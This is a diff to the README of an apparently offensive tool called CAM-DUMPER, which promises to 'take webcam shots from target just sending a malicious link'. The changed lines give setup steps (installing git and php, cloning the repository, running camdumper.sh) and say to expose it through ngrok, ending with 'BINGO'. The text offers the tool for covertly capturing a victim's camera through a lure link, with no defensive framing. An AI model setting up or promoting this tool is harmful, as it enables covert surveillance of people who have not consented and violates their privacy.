@@ -14,13 +14,15 @@ Take webcam shots from target just sending a malicious link
 
 ```
 $apt update && apt upgrade
+$apt install git
+$apt install php
 $git clone https://github.com/LiNuX-Mallu/CAM-DUMPER.git
 $cd CAM-DUMPER
 $chmod +x camdumper.sh ngrok
-$pip install php
+
 $bash camdumper.sh
 
-then make your hotspot on and choose ngrok because serveo is down
+then make your hotspot on and choose ngrok because serveo is down..  BINGO🔥
 
 
 
